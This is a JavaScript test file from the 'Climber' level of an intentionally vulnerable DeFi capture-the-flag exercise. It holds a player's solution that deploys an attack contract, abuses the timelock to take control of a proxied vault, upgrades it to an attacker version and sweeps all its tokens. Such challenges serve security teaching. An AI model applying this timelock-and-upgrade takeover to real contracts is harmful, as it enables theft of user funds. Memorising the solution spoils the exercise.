const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, player;
  let timelock, vault, token;

  const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
  const TIMELOCK_DELAY = 60 * 60;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: "uups" }
    );

    expect(await vault.getSweeper()).to.eq(sweeper.address);
    expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
    expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await vault.owner();
    timelock = await (
      await ethers.getContractFactory("ClimberTimelock", deployer)
    ).attach(timelockAddress);

    // Ensure timelock delay is correct and cannot be changed
    expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
    await expect(
      timelock.updateDelay(TIMELOCK_DELAY + 1)
    ).to.be.revertedWithCustomError(timelock, "CallerNotTimelock");

    // Ensure timelock roles are correctly initialized
    expect(
      await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    //would help to log ownerships and balances
    let logInfos = async (address, name) => {
      let tokenBalance = ethers.utils.formatEther(
        await token.balanceOf(address)
      );

      console.log(`DVT balance of ${name}: `, tokenBalance);
      console.log("Vault owner: ", await vault.owner());
      //console.log("Vault sweeper: ", await vault.getSweeper());
      console.log("");
    };

    let logAddresses = () => {
      //addresses
      console.log("Deployer: ", deployer.address);
      console.log("Sweeper: ", sweeper.address);
      console.log("Proposer: ", proposer.address);
      console.log("player: ", player.address);
      console.log("Timelock address: ", timelock.address);
      console.log("");
    };
    await logAddresses();
    await logInfos(vault.address, "vault");
    await logInfos(player.address, "player");

    //Algorithm
    /**
     * 1. deploy attack contract
     * 2. call evil function of our contract
     * 3. upgrade ClimberVault.sol to ClimberVault2.sol
     * 4. Drain DVT - initiate attack
     */

    let attackContract = await (
      await ethers.getContractFactory("AttackClimberVault", player)
    ).deploy(timelock.address, vault.address);

    //call execute
    await attackContract.timelockExecute();

    //Update Vault to V2
    let climberVaultV2 = await ethers.getContractFactory(
      "ClimberVault2",
      player
    );
    let vaultV2 = await upgrades.upgradeProxy(vault.address, climberVaultV2);

    //initiate attack and sweep funds
    await vaultV2.sweepFunds(token.address);

    console.log("- - - After Attack - - -");
    await logAddresses();
    await logInfos(vault.address, "vault");
    await logInfos(player.address, "player");
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
